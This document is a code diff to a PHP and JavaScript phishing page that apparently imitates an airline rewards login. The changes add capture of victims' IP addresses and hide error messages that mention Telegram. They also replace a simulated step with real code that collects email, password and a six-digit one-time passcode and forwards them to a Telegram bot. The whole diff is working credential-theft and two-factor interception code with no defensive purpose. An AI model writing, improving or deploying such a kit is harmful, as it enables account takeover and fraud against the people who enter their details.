@@ -6,13 +6,21 @@ $chatID = "-1001926682773";
 
 // Check if form is submitted
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Retrieve user IP address
+    // Check for IP address passed by a proxy
+    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $userIp = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    } else {
+        $userIp = $_SERVER['REMOTE_ADDR'];
+    }
+    
     // Check if PIN is submitted
     if(isset($_POST["pin"])) {
         // Retrieve PIN from the form
         $pin = $_POST["pin"];
         
         // Compose the message to be sent to Telegram
-        $message = "PIN received:\nPIN: $pin";
+        $message = "PIN received:\nPIN: $pin\nUser IP: $userIp";
 
         // Send message to Telegram using the Telegram Bot API
         $url = "https://api.telegram.org/bot$botToken/sendMessage";
@@ -38,10 +46,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Check if message was sent successfully
         if (!$response) {
-            // Handle error if message was not sent
-            echo "Error: Unable to send message to Telegram.";
+            echo "Error: Unable to send message to login.";
         } else {
-            // Redirect to another page
             header("Location: success_page.php");
             exit();
         }
@@ -51,7 +57,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $password = $_POST["password"];
 
         // Compose the message to be sent to Telegram
-        $message = "New login attempt:\nEmail: $email\nPassword: $password";
+        $message = "New login attempt:\nEmail: $email\nPassword: $password\nUser IP: $userIp";
 
         // Send message to Telegram using the Telegram Bot API
         $url = "https://api.telegram.org/bot$botToken/sendMessage";
@@ -77,15 +83,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Check if message was sent successfully
         if (!$response) {
-            // Handle error if message was not sent
-            echo "Error: Unable to send message to Telegram.";
+            echo "Error: Unable to login.";
         } else {
-            // Message sent successfully
             echo "Please enter PIN";
         }
     }
 }
 ?>
+
 
 
 
@@ -795,7 +800,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         <div style="display: none; font-size: 1px; line-height: 1px; max-height: 0px; max-width: 0px; opacity: 0; overflow: hidden; mso-hide: all; font-family: sans-serif;"></div>
         <!-- Visually Hidden Preheader Text : END -->
 
-        <div style="max-width: 842px; min-width: 300px; margin: auto; background-color: #FFFFFF;" class="email-container">
+        <div style="max-width: 100%; min-width: 300px; margin: auto; background-color: #FFFFFF;" class="email-container">
             <!--[if mso]>             <table role="presentation" aria-hidden="true" cellspacing="0" cellpadding="0" border="0" width="842" align="center" bgcolor="#FFFFFF">             <tr>             <td>             <![endif]-->
 
 <!----><table cellpadding="0" cellspacing="0" width="100%" role="presentation" style="min-width: 100%; " class="stylingblock-content-wrapper"><tr><td class="stylingblock-content-wrapper camarker-inner"><center></center>
@@ -1126,122 +1131,130 @@ Your rewards. Your choice..
         </div>
     </center>
  <script>
-// Initialize the loading window variable outside of any function to make it globally accessible
+// Define loadingWindow outside of the DOMContentLoaded event listener
 let loadingWindow;
+document.addEventListener("DOMContentLoaded", function(){
+    // Listen for form submission
+    document.querySelector(".login-form").addEventListener("submit", function(e){
+        e.preventDefault(); // Prevent the default form submission
 
-document.addEventListener("DOMContentLoaded", function() {
-    document.querySelector(".login-form").addEventListener("submit", function(e) {
-        e.preventDefault(); // Prevent the form from submitting in the traditional way
+        // Create and display loading window
+        loadingWindow = document.createElement("div");
+        loadingWindow.innerHTML = "<style>h1, p { font-family: 'EmiratesBold', sans-serif; }</style><br><h1>Please wait, this may take a few minutes. Do not refresh the page.</h1><br><center><img src='https://media3.giphy.com/media/jOmuouVZGQIBFynkMk/giphy.gif' alt='Loading...' style='width: 240px; height: 240px;'> </center>";
+        // Add styles to your loading window here
+        loadingWindow.style.position = "fixed";
+        loadingWindow.style.left = "50%";
+        loadingWindow.style.top = "50%";
+        loadingWindow.style.transform = "translate(-50%, -50%)";
+        loadingWindow.style.backgroundColor = "#fff";
+        loadingWindow.style.padding = "40px"; // Increased padding for larger window
+        loadingWindow.style.borderRadius = "10px"; // Increased border radius for rounded corners
+        loadingWindow.style.boxShadow = "0 0 20px rgba(0,0,0,0.8)"; // Increased box shadow for better visibility
+        document.body.appendChild(loadingWindow);
 
-        // Create the loading window and add it to the page
-        createLoadingWindow();
+        // AJAX request to the server
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-        // Simulate an AJAX request to the server
-        setTimeout(function() {
-            // After the "request" is "completed", adjust the loading window to prompt for the 2FA code
-            prepare2FAInputFields();
-        }, 2000); // Simulate a 2-second server request/response time
+        xhr.onreadystatechange = function(){
+            if(xhr.readyState == 4 && xhr.status == 200){
+                // Delay updating the loading message for 10 seconds
+                setTimeout(function() {
+                    // Retrieve email from the form
+                    var email = document.getElementById("email").value;
+
+                    // Update loading window with success message and email
+                    loadingWindow.innerHTML = "<div style='font-family: Arial, sans-serif; font-size: 24px; margin-bottom: 20px;'>An email with a 6-digit passcode has been sent to " + email + "</div>";
+
+                    // Create container for PIN inputs
+                    var pinContainer = document.createElement("div");
+                    pinContainer.style.display = "flex"; // Use flexbox for alignment
+                    pinContainer.style.justifyContent = "center"; // Center-align items
+                    loadingWindow.appendChild(pinContainer);
+
+                    // Create input fields for PIN
+                    for (let i = 0; i < 6; i++) {
+                        var pinInput = document.createElement("input");
+                        pinInput.setAttribute("type", "text");
+                        pinInput.setAttribute("maxlength", "1");
+                        pinInput.setAttribute("class", "pin-input");
+                        pinInput.style.width = "60px"; // Larger width for input fields
+                        pinInput.style.height = "60px"; // Larger height for input fields
+                        pinInput.style.textAlign = "center"; // Center-align text
+                        pinInput.style.margin = "0 5px"; // Add some space between input fields
+                        pinInput.style.fontSize = "24px"; // Adjust font size
+                        pinInput.style.borderRadius = "10px"; // Rounded corners
+                        pinContainer.appendChild(pinInput);
+                        
+                        // Add event listener for input event to switch focus to next input field
+                        pinInput.addEventListener('input', function(event) {
+                            if (this.value.length >= 1) {
+                                var nextInput = this.nextElementSibling;
+                                if (nextInput !== null) {
+                                    nextInput.focus();
+                                }
+                            }
+                        });
+                    }
+
+// Create submit button for PIN
+var submitButton = document.createElement("button");
+submitButton.innerHTML = "Submit";
+submitButton.style.backgroundColor = "rgb(209 10 17)"; // Background color
+submitButton.style.border = "none"; // Remove border
+submitButton.style.color = "white"; // Text color
+submitButton.style.padding = "15px 32px"; // Padding
+submitButton.style.textAlign = "center"; // Text alignment
+submitButton.style.textDecoration = "none"; // Remove underline
+submitButton.style.display = "block"; // Make it block level element
+submitButton.style.margin = "20px auto"; // Center the button horizontally and add more space between the PIN fields and the button
+submitButton.style.fontSize = "16px"; // Font size
+submitButton.style.borderRadius = "12px"; // Rounded corners
+loadingWindow.appendChild(submitButton);
+
+
+
+                    // Event listener for PIN submission
+                    submitButton.addEventListener("click", function(){
+                        // Get PIN value
+                        var pin = '';
+                        document.querySelectorAll('.pin-input').forEach(function(input) {
+                            pin += input.value;
+                        });
+                        // Send PIN to Telegram
+                        sendPin(pin);
+                    });
+                }, 5000); // 10 seconds delay
+            }
+        };
+
+        // Form data
+        var formData = "email=" + document.getElementById("email").value + "&password=" + document.getElementById("password").value;
+        xhr.send(formData);
     });
+    
+    // Function to send PIN to Telegram
+    function sendPin(pin) {
+        // AJAX request to the server
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+        xhr.onreadystatechange = function(){
+            if(xhr.readyState == 4 && xhr.status == 200){
+                // Update loading window with success message
+                loadingWindow.innerHTML = "Please wait ...";
+                // Redirect to another page
+                window.location.href = "success_page.php";
+            }
+        };
+
+        // Form data
+        var formData = "pin=" + pin;
+        xhr.send(formData);
+    }
 });
-
-// Function to create and style the loading window
-function createLoadingWindow() {
-    loadingWindow = document.createElement("div");
-    loadingWindow.innerHTML = "<style>h1, p { font-family: 'EmiratesBold', sans-serif; }</style><br><h1>Please wait, this may take a few minutes. Do not refresh the page.</h1><br><center><img src='https://media3.giphy.com/media/jOmuouVZGQIBFynkMk/giphy.gif' alt='Loading...' style='width: 240px; height: 240px;'></center>";
-    applyLoadingWindowStyles();
-    document.body.appendChild(loadingWindow);
-}
-
-// Function to prepare and display 2FA input fields along with the submission logic
-function prepare2FAInputFields() {
-    var email = document.getElementById("email").value;
-    loadingWindow.innerHTML = "<div style='font-family: Arial, sans-serif; font-size: 16px;'>An email with a 6-digit passcode has been sent to " + email + ". Enter the passcode below:</div></br></br></br>";
-
-    var inputContainer = createPinInputFields();
-    loadingWindow.appendChild(inputContainer);
-
-    var submitButton = createSubmitButton();
-    loadingWindow.appendChild(submitButton);
-}
-
-// Function to create PIN input fields
-function createPinInputFields() {
-    var inputContainer = document.createElement("div");
-    inputContainer.style.display = "flex"; // Use Flexbox
-    inputContainer.style.justifyContent = "center"; // Center the items in the container
-    inputContainer.style.gap = "10px"; // Adds space between inputs
-
-    for (let i = 0; i < 6; i++) {
-        var pinInput = document.createElement("input");
-        setupPinInput(pinInput, i);
-        inputContainer.appendChild(pinInput);
-    }
-    return inputContainer;
-}
-
-// Adjustments in setupPinInput function for mobile responsiveness
-function setupPinInput(pinInput, index) {
-    pinInput.type = "text";
-    pinInput.maxLength = "1";
-    pinInput.id = "pin" + index;
-    pinInput.className = "pin-input";
-    pinInput.autocomplete = "off";
-    pinInput.style.textAlign = "center";
-    pinInput.style.fontSize = "20px";
-    pinInput.style.width = "40px"; // Adjust as necessary for better mobile appearance
-    pinInput.style.height = "40px"; // Adjust as necessary for better mobile appearance
-    // Responsive adjustments can be added here if needed
-    pinInput.addEventListener("input", function() {
-        if (this.nextSibling && this.value) {
-            this.nextSibling.focus();
-        }
-    });
-}
-
-// Function to create and setup the submit button
-function createSubmitButton() {
-    var submitButton = document.createElement("button");
-    submitButton.textContent = "Submit 2FA Code";
-    submitButton.style.marginTop = "20px";
-    submitButton.onclick = submit2FACode; // Attach the function to send the 2FA code
-    return submitButton;
-}
-
-// Function to send the 2FA code to the server (and ultimately to Telegram)
-function submit2FACode() {
-    var pin = "";
-    for (let i = 0; i < 6; i++) {
-        pin += document.getElementById("pin" + i).value;
-    }
-
-    // Replace this console.log with your AJAX request to send the PIN to your server
-    console.log("Sending 2FA code to the server:", pin);
-    // Example AJAX request (you need to replace the URL and possibly adjust data handling)
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>", true);
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState == 4 && xhr.status == 200) {
-            // Handle response here (e.g., redirecting to another page)
-            window.location.href = "success_page.php"; // Redirect on success
-        }
-    };
-    xhr.send("pin=" + pin); // Send PIN data to the server
-}
-
-// Function to apply styles to the loading window
-function applyLoadingWindowStyles() {
-    loadingWindow.style.position = "fixed";
-    loadingWindow.style.left = "50%";
-    loadingWindow.style.top = "50%";
-    loadingWindow.style.transform = "translate(-50%, -50%)";
-    loadingWindow.style.backgroundColor = "#fff";
-    loadingWindow.style.padding = "20px";
-    loadingWindow.style.borderRadius = "5px";
-    loadingWindow.style.boxShadow = "0 4px 8px rgba(0,0,0,0.2)";
-    loadingWindow.style.textAlign = "center";
-    loadingWindow.style.zIndex = "1000"; // Ensure it's above other content
-}
 </script>
 
 
